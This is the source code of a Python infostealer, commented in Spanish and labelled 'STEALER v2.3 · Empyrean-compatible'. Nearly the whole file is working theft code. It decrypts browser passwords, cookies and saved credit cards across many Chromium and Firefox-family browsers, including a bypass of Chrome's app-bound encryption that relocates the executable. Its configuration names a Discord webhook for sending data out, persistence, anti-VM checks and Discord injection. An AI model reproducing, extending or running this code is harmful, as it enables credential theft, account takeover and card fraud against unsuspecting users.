"""
STEALER v2.3 · Empyrean-compatible
cookies/contrasenas/tarjetas (ABE), sistema, wifi, tokens multi-navegador,
enriquecido de cuentas, inyeccion en Discord, captura, persistencia.
"""
import base64
import csv as _csv
import ctypes
import hashlib
import hmac
import io
import json
import os
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
import uuid
import winreg
import zipfile
from ctypes import wintypes
from datetime import datetime
from pathlib import Path

try:
    import requests
except Exception:
    requests = None

try:
    import websocket
    WEBSOCKET = True
except Exception:
    WEBSOCKET = False

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Util.Padding import unpad
    CRYPTO = True
except Exception:
    CRYPTO = False

try:
    from PIL import ImageGrab
    PIL_OK = True
except Exception:
    PIL_OK = False

# ----------------------------- config -----------------------------
try:
    from _config import (
        WEBHOOK, NOMBRE, PERSISTENCIA, CAPTURA, ROBAR_DISCORD, ROBAR_WIFI,
        VALIDAR_TOKENS, INYECTAR, AUTO_NITRO, PING_ON_RUN, ANTI_VM,
        WEBHOOK_KEY, SELF_DESTRUCT, ICONO,
    )
except Exception:
    WEBHOOK        = "PEGA_TU_WEBHOOK_AQUI"
    NOMBRE         = "Empyrean"
    PERSISTENCIA   = True
    CAPTURA        = True
    ROBAR_DISCORD  = True
    ROBAR_WIFI     = True
    VALIDAR_TOKENS = True
    INYECTAR       = True
    AUTO_NITRO     = False
    PING_ON_RUN    = False
    ANTI_VM        = True
    WEBHOOK_KEY    = ""
    SELF_DESTRUCT  = False
    ICONO          = "https://i.imgur.com/ihzoAWl.jpeg"

LOCAL  = os.environ.get("LOCALAPPDATA", "")
ROAM   = os.environ.get("APPDATA", "")
PERFIL = os.environ.get("USERPROFILE", "")
TEMP   = tempfile.gettempdir()
NO_WIN = 0x08000000
UA     = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

RUTA_LOG = Path(TEMP) / f"{NOMBRE}_log.txt"

def log(msg):
    linea = f"[{datetime.now():%H:%M:%S}] {msg}"
    try:
        print(linea)
    except Exception:
        pass
    try:
        with open(RUTA_LOG, "a", encoding="utf-8") as f:
            f.write(linea + "\n")
    except Exception:
        pass

def guardar(ruta, texto):
    ruta = Path(ruta)
    ruta.parent.mkdir(parents=True, exist_ok=True)
    ruta.write_text(texto, encoding="utf-8", errors="ignore")

def ps(cmd, timeout=25):
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                           capture_output=True, text=True, timeout=timeout,
                           creationflags=NO_WIN)
        return r.stdout.strip()
    except Exception:
        return ""

def dpapi(blob):
    if not blob:
        return b""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_byte))]
    buf = ctypes.create_string_buffer(bytes(blob), len(blob))
    entrada = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_byte)))
    salida = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(entrada), None, None, None, None, 0, ctypes.byref(salida)):
        return b""
    datos = ctypes.string_at(salida.pbData, salida.cbData)
    ctypes.windll.kernel32.LocalFree(salida.pbData)
    return datos

def copiar_db(origen):
    origen = Path(origen)
    if not origen.exists():
        return None
    destino = Path(TEMP) / f"{uuid.uuid4().hex}_{origen.name}"
    try:
        shutil.copy2(origen, destino)
    except Exception:
        return None
    for suf in ("-wal", "-shm", "-journal"):
        extra = Path(str(origen) + suf)
        if extra.exists():
            try:
                shutil.copy2(extra, Path(str(destino) + suf))
            except Exception:
                pass
    return destino

def consultar(ruta, sql):
    try:
        con = sqlite3.connect(f"file:{ruta}?mode=ro", uri=True)
        con.text_factory = lambda b: b.decode("utf-8", "ignore")
        cur = con.cursor()
        cur.execute(sql)
        filas = cur.fetchall()
        con.close()
        return filas
    except Exception:
        return []

def columnas(ruta, tabla):
    return [f[1] for f in consultar(ruta, f"PRAGMA table_info({tabla})")]

def borrar(p):
    try:
        os.remove(p)
    except Exception:
        pass

# ======================================================================
#   APP-BOUND ENCRYPTION (v20)
#   El servicio de elevacion valida la ruta del proceso llamante, asi
#   que ademas del intento directo se reubica el exe en el directorio
#   del navegador y se reintenta desde ahi.
# ======================================================================
IID_ELEVADOR = "{463ABECF-410D-407F-8AF5-0DF35A005CC8}"
CLSID_ELEVADOR = {
    "Chrome":        "{708860E0-F641-4611-8895-7D867DD3675B}",
    "Chrome Beta":   "{708860E0-F641-4611-8895-7D867DD3675B}",
    "Chrome Dev":    "{708860E0-F641-4611-8895-7D867DD3675B}",
    "Chrome Canary": "{708860E0-F641-4611-8895-7D867DD3675B}",
    "Edge":          "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
    "Edge Beta":     "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
    "Edge Dev":      "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
    "Edge Canary":   "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
    "Brave":         "{576B31AF-6369-4E6B-8560-E4651B8A9A34}",
    "Brave Beta":    "{576B31AF-6369-4E6B-8560-E4651B8A9A34}",
    "Brave Nightly": "{576B31AF-6369-4E6B-8560-E4651B8A9A34}",
    "Vivaldi":       "{576B31AF-6369-4E6B-8560-E4651B8A9A34}",
}

EXE_NAVEGADOR = {
    "Chrome": "chrome.exe", "Chrome Beta": "chrome.exe",
    "Chrome Dev": "chrome.exe", "Chrome Canary": "chrome.exe",
    "Edge": "msedge.exe", "Edge Beta": "msedge.exe",
    "Edge Dev": "msedge.exe", "Edge Canary": "msedge.exe",
    "Brave": "brave.exe", "Brave Beta": "brave.exe", "Brave Nightly": "brave.exe",
    "Vivaldi": "vivaldi.exe", "Opera": "opera.exe", "OperaGX": "opera.exe",
    "OperaCrypto": "opera.exe", "OperaAir": "opera.exe",
    "Chromium": "chrome.exe", "Yandex": "browser.exe", "Slimjet": "slimjet.exe",
    "Whale": "whale.exe", "CocCoc": "browser.exe",
}

DIRS_NAVEGADOR = {
    "Chrome": [Path(LOCAL) / "Google" / "Chrome" / "Application",
               Path(os.environ.get("PROGRAMFILES", "")) / "Google" / "Chrome" / "Application",
               Path(os.environ.get("PROGRAMFILES(X86)", "")) / "Google" / "Chrome" / "Application"],
    "Edge":   [Path(LOCAL) / "Microsoft" / "Edge" / "Application",
               Path(os.environ.get("PROGRAMFILES(X86)", "")) / "Microsoft" / "Edge" / "Application"],
    "Brave":  [Path(LOCAL) / "BraveSoftware" / "Brave-Browser" / "Application",
               Path(os.environ.get("PROGRAMFILES", "")) / "BraveSoftware" / "Brave-Browser" / "Application"],
}

def _exe_navegador(nombre, base=None):
    """Busca el ejecutable: primero junto al perfil, luego rutas conocidas y App Paths."""
    candidatos = []

    if base is not None:
        for sub in (base.parent / "Application", base.parent, base,
                    Path(LOCAL) / "Programs" / nombre):
            try:
                if sub.is_dir():
                    for exe in sorted(sub.glob("*.exe")):
                        bajo = exe.name.lower()
                        if any(x in bajo for x in ("crashpad", "setup",
                                                   "uninstall", "elevation")):
                            continue
                        candidatos.append(exe)
            except Exception:
                pass

    for d in DIRS_NAVEGADOR.get(nombre, []):
        p = d / EXE_NAVEGADOR.get(nombre, "")
        if p.exists():
            candidatos.append(p)

    exe_nombre = EXE_NAVEGADOR.get(nombre)
    if exe_nombre:
        for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
            try:
                with winreg.OpenKey(
                        raiz,
                        rf"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\{exe_nombre}") as k:
                    candidatos.append(Path(winreg.QueryValueEx(k, "")[0]))
            except Exception:
                pass

    for c in candidatos:
        try:
            if c.exists() and c.suffix.lower() == ".exe":
                return c
        except Exception:
            pass
    return None

def _puerto_libre():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p

# ---------------- cliente websocket minimo (sin dependencias) -----
class WS:
    """RFC6455 justo lo necesario para hablar con CDP."""

    def __init__(self, url, timeout=25):
        m = re.match(r"ws://([^/:]+)(?::(\d+))?(/.*)?$", url)
        if not m:
            raise ValueError(f"url ws invalida: {url}")
        host, puerto, ruta = m.group(1), int(m.group(2) or 80), m.group(3) or "/"
        self.sock = socket.create_connection((host, puerto), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        clave = base64.b64encode(os.urandom(16)).decode()
        peticion = (
            f"GET {ruta} HTTP/1.1\r\n"
            f"Host: {host}:{puerto}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {clave}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n")
        self.sock.sendall(peticion.encode())
        while b"\r\n\r\n" not in self.buf:
            trozo = self.sock.recv(4096)
            if not trozo:
                raise ConnectionError("handshake cerrado")
            self.buf += trozo
        cabecera, _, resto = self.buf.partition(b"\r\n\r\n")
        primera = cabecera.split(b"\r\n")[0].decode("latin-1", "ignore")
        if "101" not in primera:
            raise ConnectionError(primera)
        self.buf = resto

    def _leer(self, n):
        while len(self.buf) < n:
            trozo = self.sock.recv(65536)
            if not trozo:
                raise ConnectionError("cerrado")
            self.buf += trozo
        datos, self.buf = self.buf[:n], self.buf[n:]
        return datos

    def enviar(self, texto):
        carga = texto.encode("utf-8")
        mascara = os.urandom(4)
        n = len(carga)
        if n < 126:
            cab = struct.pack("!BB", 0x81, 0x80 | n)
        elif n < 65536:
            cab = struct.pack("!BBH", 0x81, 0x80 | 126, n)
        else:
            cab = struct.pack("!BBQ", 0x81, 0x80 | 127, n)
        enmascarado = bytes(b ^ mascara[i % 4] for i, b in enumerate(carga))
        self.sock.sendall(cab + mascara + enmascarado)

    def recibir(self):
        while True:
            b1, b2 = struct.unpack("!BB", self._leer(2))
            fin = b1 & 0x80
            opcode = b1 & 0x0F
            largo = b2 & 0x7F
            if largo == 126:
                largo = struct.unpack("!H", self._leer(2))[0]
            elif largo == 127:
                largo = struct.unpack("!Q", self._leer(8))[0]
            datos = self._leer(largo) if largo else b""
            if opcode == 0x8:
                raise ConnectionError("close")
            if opcode == 0x9:
                mascara = os.urandom(4)
                carga = bytes(b ^ mascara[i % 4] for i, b in enumerate(datos))
                self.sock.sendall(bytes([0x8A, 0x80 | len(datos)]) + mascara + carga)
                continue
            if opcode == 0xA:
                continue
            if opcode in (0x1, 0x2):
                if fin:
                    return datos.decode("utf-8", "ignore")
                acumulado = datos
                while True:
                    c1, c2 = struct.unpack("!BB", self._leer(2))
                    largoc = c2 & 0x7F
                    if largoc == 126:
                        largoc = struct.unpack("!H", self._leer(2))[0]
                    elif largoc == 127:
                        largoc = struct.unpack("!Q", self._leer(8))[0]
                    acumulado += self._leer(largoc) if largoc else b""
                    if c1 & 0x80:
                        return acumulado.decode("utf-8", "ignore")

    def cerrar(self):
        try:
            self.sock.close()
        except Exception:
            pass

_ole = ctypes.windll.oleaut32
_ole.SysAllocStringLen.restype = ctypes.c_void_p
_ole.SysAllocStringLen.argtypes = [ctypes.c_wchar_p, ctypes.c_uint]
_ole.SysFreeString.argtypes = [ctypes.c_void_p]
_ole.SysStringLen.argtypes = [ctypes.c_void_p]

class GUID(ctypes.Structure):
    _fields_ = [("d1", ctypes.c_ulong), ("d2", ctypes.c_ushort),
                ("d3", ctypes.c_ushort), ("d4", ctypes.c_ubyte * 8)]

def _guid(texto):
    u = uuid.UUID(texto)
    g = GUID()
    g.d1 = u.time_low
    g.d2 = u.time_mid
    g.d3 = u.time_hi_version
    for i, b in enumerate(u.bytes[8:]):
        g.d4[i] = b
    return g

def _bstr_a_bytes(bstr):
    if not bstr:
        return b""
    n = _ole.SysStringLen(bstr)
    buf = ctypes.cast(bstr, ctypes.POINTER(ctypes.c_ushort))
    return bytes(buf[i] & 0xFF for i in range(n))

def _bytes_a_bstr(datos):
    n = len(datos)
    buf = (ctypes.c_wchar * (n + 1))()
    for i, b in enumerate(datos):
        buf[i] = chr(b)
    return _ole.SysAllocStringLen(buf, n)

def _decrypt_data(clsid, datos, nivel):
    ole32 = ctypes.windll.ole32
    ole32.CoInitializeEx(None, 2)
    ole32.CoCreateInstance.argtypes = [
        ctypes.POINTER(GUID), ctypes.c_void_p, ctypes.c_ulong,
        ctypes.POINTER(GUID), ctypes.POINTER(ctypes.c_void_p)]
    ole32.CoCreateInstance.restype = ctypes.c_long

    ptr = ctypes.c_void_p()
    if ole32.CoCreateInstance(ctypes.byref(_guid(clsid)), None, 0x17,
                              ctypes.byref(_guid(IID_ELEVADOR)),
                              ctypes.byref(ptr)) != 0 or not ptr:
        return None
    vtable = ctypes.cast(ptr, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p))).contents
    try:
        prototipo = ctypes.WINFUNCTYPE(
            ctypes.c_long, ctypes.c_void_p, ctypes.c_int,
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_ulong))
        fn = prototipo(vtable[5])
        entrada = _bytes_a_bstr(datos)
        salida = ctypes.c_void_p()
        error = ctypes.c_ulong(0)
        if fn(ptr, nivel, entrada, ctypes.byref(salida), ctypes.byref(error)) != 0 or not salida:
            return None
        resultado = _bstr_a_bytes(salida)
        _ole.SysFreeString(salida)
        return resultado
    except Exception:
        return None
    finally:
        try:
            ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vtable[2])(ptr)
        except Exception:
            pass

def _claves_abe_com(local_state, navegador):
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            blob = base64.b64decode(json.load(f)["os_crypt"]["app_bound_encrypted_key"])
    except Exception:
        return []
    if not blob.startswith(b"APPB"):
        return []
    blob = blob[4:]

    candidatos = []
    desenvuelto = dpapi(blob)
    if desenvuelto:
        candidatos.append(desenvuelto)
    candidatos.append(blob)

    propio = CLSID_ELEVADOR.get(navegador)
    orden = ([propio] if propio else []) + \
            [c for c in dict.fromkeys(CLSID_ELEVADOR.values()) if c != propio]

    claves = []
    for datos in candidatos:
        for clsid in dict.fromkeys(orden):
            for nivel in (1, 2, 3, 4):
                clave = _decrypt_data(clsid, datos, nivel)
                if clave and len(clave) == 32 and clave not in claves:
                    claves.append(clave)
    return claves

def _claves_abe_reubicado(local_state, navegador):
    origen = Path(sys.executable)
    congelado = getattr(sys, "frozen", False)

    entorno = os.environ.copy()
    if not congelado:
        entorno["PYTHONHOME"] = sys.prefix
        entorno["PYTHONPATH"] = os.pathsep.join(sys.path)

    for d in DIRS_NAVEGADOR.get(navegador, []):
        if not d.exists():
            continue
        try:
            destino = d / origen.name
            if origen.resolve() != destino.resolve():
                shutil.copy2(origen, destino)
                if not congelado:
                    for dll in origen.parent.glob("*.dll"):
                        try:
                            shutil.copy2(dll, d / dll.name)
                        except Exception:
                            pass

            salida = Path(TEMP) / f"abe_{uuid.uuid4().hex}.json"
            cmd = [str(destino)]
            if not congelado:
                cmd.append(str(Path(__file__).resolve()))
            cmd += ["--abe", navegador, str(local_state), str(salida)]

            subprocess.run(cmd, capture_output=True, timeout=45,
                           creationflags=NO_WIN, env=entorno)

            if salida.exists():
                crudo = json.loads(salida.read_text(encoding="utf-8"))
                borrar(salida)
                claves = [base64.b64decode(x) for x in crudo if x]
                if claves:
                    log(f"  ABE reubicado ok ({navegador} -> {d})")
                    return claves
        except Exception as e:
            log(f"  ABE reubicado {navegador}: {e}")
    return []

def claves_app_bound(local_state, navegador):
    claves = _claves_abe_com(local_state, navegador)
    if claves:
        return claves
    return _claves_abe_reubicado(local_state, navegador)

def limpiar_prefijo_abe(plano):
    if len(plano) > 32:
        try:
            return plano[32:].decode("utf-8")
        except UnicodeDecodeError:
            pass
    return plano.decode("utf-8", "ignore")

def _get_json(url, timeout=2):
    try:
        if requests is not None:
            return requests.get(url, timeout=timeout).json()
        import urllib.request
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8", "ignore"))
    except Exception:
        return {}

def validar_claves(claves, db_cookies):
    """Descarta claves ABE que no descifran ningun v20 real. [] si ninguna sirve."""
    if not claves or not CRYPTO or not db_cookies:
        return claves
    copia = copiar_db(db_cookies)
    if not copia:
        return claves
    buenas, vistos = [], 0
    try:
        for (blob,) in consultar(
                copia, "SELECT encrypted_value FROM cookies "
                       "WHERE encrypted_value IS NOT NULL LIMIT 200"):
            if isinstance(blob, str):
                blob = blob.encode("utf-8", "ignore")
            if not blob or blob[:3] != b"v20":
                continue
            vistos += 1
            nonce, cuerpo = blob[3:15], blob[15:]
            for clave in claves:
                if clave in buenas:
                    continue
                try:
                    AES.new(clave, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
                        cuerpo[:-16], cuerpo[-16:])
                    buenas.append(clave)
                except Exception:
                    pass
    except Exception:
        pass
    finally:
        borrar(copia)
    return claves if not vistos else buenas

# --------------------------- descifrado ---------------------------
def clave_chromium(local_state):
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            clave = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return dpapi(clave)
    except Exception:
        return None

def descifrar_chromium(valor, clave_dpapi, claves_abe):
    if valor is None:
        return ""
    if isinstance(valor, str):
        valor = valor.encode("utf-8", "ignore")
    if not valor:
        return ""
    prefijo = valor[:3]

    if prefijo == b"v20" and claves_abe and CRYPTO:
        nonce, cuerpo = valor[3:15], valor[15:]
        for clave in claves_abe:
            try:
                plano = AES.new(clave, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
                    cuerpo[:-16], cuerpo[-16:])
                return limpiar_prefijo_abe(plano)
            except Exception:
                continue

    if prefijo in (b"v10", b"v11") and clave_dpapi and CRYPTO:
        try:
            nonce, cuerpo = valor[3:15], valor[15:]
            plano = AES.new(clave_dpapi, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
                cuerpo[:-16], cuerpo[-16:])
            return plano.decode("utf-8", "ignore")
        except Exception:
            pass

    try:
        return dpapi(valor).decode("utf-8", "ignore")
    except Exception:
        return ""

def tlv(datos, off=0):
    etiqueta = datos[off]; off += 1
    largo = datos[off]; off += 1
    if largo & 0x80:
        n = largo & 0x7F
        largo = int.from_bytes(datos[off:off + n], "big")
        off += n
    return etiqueta, datos[off:off + largo], off + largo

def clave_firefox(key4db):
    if not CRYPTO:
        return None
    try:
        con = sqlite3.connect(f"file:{key4db}?mode=ro", uri=True)
        fila = con.execute(
            "SELECT item1, item2 FROM metadata WHERE id = 'password'").fetchone()
        con.close()
        if not fila:
            return None
        item1 = bytes(fila[0])
        item2 = bytes(fila[1])
        _, cuerpo1, _ = tlv(item1)
        _, salt_global, _ = tlv(cuerpo1, 0)
        etq, contenido, off = tlv(item2)
        if etq == 0x30:
            item2 = contenido
            _, salt_entrada, off = tlv(item2, 0)
        else:
            salt_entrada = contenido
        etq2, contenido2, off2 = tlv(item2, off)
        if etq2 == 0x30:
            _, iv, o = tlv(contenido2, 0)
            _, cifrado, _ = tlv(contenido2, o)
        else:
            iv = contenido2
            _, cifrado, _ = tlv(item2, off2)
        hp = hashlib.sha1(salt_global).digest()
        k = hashlib.pbkdf2_hmac("sha1", hp, salt_entrada, 1, 20)
        tk = hashlib.sha1(k + salt_entrada + iv).digest()
        clave = (tk + hashlib.sha1(tk + salt_entrada + iv).digest())[:24]
        plano = DES3.new(clave, DES3.MODE_CBC, iv[:8]).decrypt(cifrado)
        return unpad(plano, 8)[:24]
    except Exception:
        return None

def descifrar_firefox(b64, clave):
    if not clave or not CRYPTO or not b64:
        return ""
    try:
        datos = base64.b64decode(b64)
        plano = DES3.new(clave, DES3.MODE_CBC, datos[:8]).decrypt(datos[8:])
        texto = unpad(plano, 8).decode("utf-8", "ignore")
        if "\x00" in texto:
            partes = [p for p in texto.split("\x00") if p]
            if partes:
                return partes[-1]
        return texto
    except Exception:
        return ""

# -------------------------- navegadores ---------------------------
RUTAS_CHROMIUM = {
    "Chrome":        Path(LOCAL) / "Google" / "Chrome" / "User Data",
    "Chrome Beta":   Path(LOCAL) / "Google" / "Chrome Beta" / "User Data",
    "Chrome Dev":    Path(LOCAL) / "Google" / "Chrome Dev" / "User Data",
    "Chrome Canary": Path(LOCAL) / "Google" / "Chrome SxS" / "User Data",
    "Edge":          Path(LOCAL) / "Microsoft" / "Edge" / "User Data",
    "Edge Beta":     Path(LOCAL) / "Microsoft" / "Edge Beta" / "User Data",
    "Edge Dev":      Path(LOCAL) / "Microsoft" / "Edge Dev" / "User Data",
    "Edge Canary":   Path(LOCAL) / "Microsoft" / "Edge SxS" / "User Data",
    "Brave":         Path(LOCAL) / "BraveSoftware" / "Brave-Browser" / "User Data",
    "Brave Beta":    Path(LOCAL) / "BraveSoftware" / "Brave-Browser-Beta" / "User Data",
    "Brave Nightly": Path(LOCAL) / "BraveSoftware" / "Brave-Browser-Nightly" / "User Data",
    "Vivaldi":       Path(LOCAL) / "Vivaldi" / "User Data",
    "Chromium":      Path(LOCAL) / "Chromium" / "User Data",
    "Yandex":        Path(LOCAL) / "Yandex" / "YandexBrowser" / "User Data",
    "Slimjet":       Path(LOCAL) / "Slimjet" / "User Data",
    "Whale":         Path(LOCAL) / "Naver" / "Naver Whale" / "User Data",
    "CocCoc":        Path(LOCAL) / "CocCoc" / "Browser" / "User Data",
    "Uran":          Path(LOCAL) / "uCozMedia" / "Uran" / "User Data",
    "Iridium":       Path(LOCAL) / "Iridium" / "User Data",
    "EpicPrivacy":   Path(LOCAL) / "Epic Privacy Browser" / "User Data",
    "Torch":         Path(LOCAL) / "Torch" / "User Data",
    "Opera":         Path(ROAM) / "Opera Software" / "Opera Stable",
    "OperaGX":       Path(ROAM) / "Opera Software" / "Opera GX Stable",
    "OperaCrypto":   Path(ROAM) / "Opera Software" / "Opera Crypto Stable",
    "OperaAir":      Path(ROAM) / "Opera Software" / "Opera Air Stable",
}

RUTAS_GECKO = {
    "Firefox":      Path(ROAM) / "Mozilla" / "Firefox",
    "Waterfox":     Path(ROAM) / "Waterfox",
    "LibreWolf":    Path(ROAM) / "librewolf",
    "PaleMoon":     Path(ROAM) / "Moonchild Productions" / "Pale Moon",
    "Basilisk":     Path(ROAM) / "Moonchild Productions" / "Basilisk",
    "SeaMonkey":    Path(ROAM) / "Mozilla" / "SeaMonkey",
    "Thunderbird":  Path(ROAM) / "Thunderbird",
}

def archivo(perfil, nombre):
    for cand in (perfil / nombre, perfil / "Network" / nombre):
        if cand.exists():
            return cand
    return None

def perfiles_chromium(base):
    salida = []
    if not base.exists():
        return salida
    if archivo(base, "Cookies") or archivo(base, "Login Data"):
        salida.append(base)
    try:
        for hijo in base.iterdir():
            if hijo.is_dir() and (archivo(hijo, "Cookies")
                                  or archivo(hijo, "Login Data")
                                  or archivo(hijo, "Web Data")):
                salida.append(hijo)
    except Exception:
        pass
    return salida

CONTADOR = {"cookies": 0, "passwords": 0, "tarjetas": 0, "tokens": 0, "wifi": 0}

def extraer_chromium(nombre, base, destino):
    carpeta = Path(destino) / nombre
    carpeta.mkdir(parents=True, exist_ok=True)
    estado = [f"### {nombre}", f"ruta: {base}",
              f"instalado: {'si' if base.exists() else 'no'}"]

    perfiles = perfiles_chromium(base)
    estado.append(f"perfiles: {len(perfiles)}")
    if not perfiles:
        guardar(carpeta / "_estado.txt", "\n".join(estado))
        return 0

    clave_dpapi = None
    claves_abe = []
    ls = base / "Local State"
    if ls.exists():
        clave_dpapi = clave_chromium(ls)
        claves_abe = claves_app_bound(ls, nombre)
        if claves_abe:
            muestra = None
            for p in perfiles:
                muestra = archivo(p, "Cookies")
                if muestra:
                    break
            claves_abe = validar_claves(claves_abe, muestra)
        estado.append(f"v20: {len(claves_abe)} clave(s) validada(s)")
        estado.append(f"v10: {'si' if clave_dpapi else 'no'}")
        log(f"  {nombre}: v20={len(claves_abe)} · v10={'si' if clave_dpapi else 'no'}")

    total = 0
    pass_ok = 0
    fallos_pass = 0

    for perfil in perfiles:
        etiqueta = perfil.name if perfil != base else "Principal"
        sub = carpeta / etiqueta

        db = archivo(perfil, "Cookies")
        if db:
            copia = copiar_db(db)
            if copia:
                cols = columnas(copia, "cookies")
                if cols:
                    sel = ["host_key", "name", "value", "encrypted_value", "path"]
                    for c in ("expires_utc", "is_secure", "is_httponly"):
                        if c in cols:
                            sel.append(c)
                    filas = consultar(copia, f"SELECT {','.join(sel)} FROM cookies")
                    lineas = [f"### {nombre} / {etiqueta}\n", "host | nombre | valor\n"]
                    cifradas = [f"### {nombre} / {etiqueta} (sin descifrar)\n",
                                "host | nombre | blob_base64\n"]
                    n = 0
                    fallos = 0
                    for fila in filas:
                        d = dict(zip(sel, fila))
                        crudo = d.get("encrypted_value")
                        val = d.get("value") or descifrar_chromium(
                            crudo, clave_dpapi, claves_abe)
                        if not val:
                            if crudo:
                                fallos += 1
                                if isinstance(crudo, str):
                                    crudo = crudo.encode("utf-8", "ignore")
                                cifradas.append(f"{d.get('host_key','')} | "
                                                f"{d.get('name','')} | "
                                                f"{base64.b64encode(crudo).decode()}")
                            continue
                        n += 1
                        lineas.append(f"{d.get('host_key','')} | {d.get('name','')} | {val}")
                    if n:
                        guardar(sub / "cookies.txt", "\n".join(lineas))
                        CONTADOR["cookies"] += n
                        total += n
                    if fallos:
                        guardar(sub / "cookies_cifradas.txt", "\n".join(cifradas))
                    estado.append(f"cookies: {n} ok / {fallos} cifradas")
                borrar(copia)

        db = archivo(perfil, "Login Data")
        if db:
            copia = copiar_db(db)
            if copia:
                filas = consultar(copia,
                    "SELECT origin_url, username_value, password_value FROM logins")
                lineas = [f"### {nombre} / {etiqueta}\n", "url | usuario | contrasena\n"]
                sin_clave = [f"### {nombre} / {etiqueta} (sin clave)\n",
                             "url | usuario\n"]
                n = 0
                fallos = 0
                for url, user, pw in filas:
                    if not user and not pw:
                        continue
                    p = descifrar_chromium(pw, clave_dpapi, claves_abe)
                    if not p:
                        fallos += 1
                        sin_clave.append(f"{url} | {user}")
                        continue
                    n += 1
                    lineas.append(f"{url} | {user} | {p}")
                if n:
                    guardar(sub / "passwords.txt", "\n".join(lineas))
                    CONTADOR["passwords"] += n
                    total += n
                    pass_ok += n
                if fallos:
                    guardar(sub / "passwords_sin_clave.txt", "\n".join(sin_clave))
                    fallos_pass += fallos
                estado.append(f"passwords: {n} ok / {fallos} cifradas")
                borrar(copia)

        db = archivo(perfil, "Web Data")
        if db:
            copia = copiar_db(db)
            if copia:
                cols = columnas(copia, "credit_cards")
                if cols:
                    sel = [c for c in ("name_on_card", "expiration_month",
                                       "expiration_year", "card_number_encrypted",
                                       "card_number") if c in cols]
                    filas = consultar(copia, f"SELECT {','.join(sel)} FROM credit_cards")
                    lineas = [f"### {nombre} / {etiqueta}\n", "titular | mes | anio | numero\n"]
                    n = 0
                    for fila in filas:
                        d = dict(zip(sel, fila))
                        num = d.get("card_number") or descifrar_chromium(
                            d.get("card_number_encrypted"), clave_dpapi, claves_abe)
                        if not num:
                            continue
                        n += 1
                        lineas.append(" | ".join(str(d.get(k, "")) for k in (
                            "name_on_card", "expiration_month",
                            "expiration_year")) + f" | {num}")
                    if n:
                        guardar(sub / "tarjetas.txt", "\n".join(lineas))
                        CONTADOR["tarjetas"] += n
                        total += n
                    estado.append(f"tarjetas: {n}")
                borrar(copia)

    if pass_ok == 0 or fallos_pass:
        try:
            n = exportar_passwords(nombre, base, destino)
            if n:
                CONTADOR["passwords"] += n
                total += n
                estado.append(f"metodo: export CDP -> {n}")
            else:
                estado.append("metodo: export CDP -> sin resultado")
        except Exception as e:
            estado.append(f"metodo: export CDP -> error {e}")
            log(f"  export {nombre}: {e}")

    guardar(carpeta / "_estado.txt", "\n".join(estado))
    return total

def extraer_gecko(nombre, base, destino):
    carpeta = Path(destino) / nombre
    carpeta.mkdir(parents=True, exist_ok=True)
    estado = [f"### {nombre}", f"ruta: {base}",
              f"instalado: {'si' if base.exists() else 'no'}"]

    raiz = base / "Profiles"
    if not raiz.exists():
        raiz = base
    total = 0
    try:
        subperfiles = [p for p in raiz.iterdir() if p.is_dir()]
    except Exception:
        subperfiles = []
    estado.append(f"perfiles: {len(subperfiles)}")

    for perfil in subperfiles:
        if not ((perfil / "cookies.sqlite").exists()
                or (perfil / "logins.json").exists()):
            continue
        sub = carpeta / perfil.name
        db = perfil / "cookies.sqlite"
        if db.exists():
            copia = copiar_db(db)
            if copia:
                filas = consultar(copia, """
                    SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                    FROM moz_cookies""")
                lineas = [f"### {nombre} / {perfil.name}\n", "host | nombre | valor\n"]
                n = 0
                for h, nom, v, *_ in filas:
                    if not v:
                        continue
                    n += 1
                    lineas.append(f"{h} | {nom} | {v}")
                if n:
                    guardar(sub / "cookies.txt", "\n".join(lineas))
                    CONTADOR["cookies"] += n
                    total += n
                borrar(copia)
        logins, key4 = perfil / "logins.json", perfil / "key4.db"
        if logins.exists() and key4.exists():
            clave = clave_firefox(key4)
            if clave:
                try:
                    entradas = json.loads(
                        logins.read_text(encoding="utf-8", errors="ignore")).get("logins", [])
                    lineas = [f"### {nombre} / {perfil.name}\n", "url | usuario | contrasena\n"]
                    n = 0
                    for e in entradas:
                        pw = descifrar_firefox(e.get("encryptedPassword"), clave)
                        if not pw:
                            continue
                        n += 1
                        lineas.append(f"{e.get('hostname','')} | "
                                      f"{descifrar_firefox(e.get('encryptedUsername'), clave)} | {pw}")
                    if n:
                        guardar(sub / "passwords.txt", "\n".join(lineas))
                        CONTADOR["passwords"] += n
                        total += n
                    estado.append(f"{perfil.name}: {n} contrasenas")
                except Exception as e:
                    estado.append(f"{perfil.name}: error {e}")
            else:
                estado.append(f"{perfil.name}: key4 sin clave")

    guardar(carpeta / "_estado.txt", "\n".join(estado))
    return total

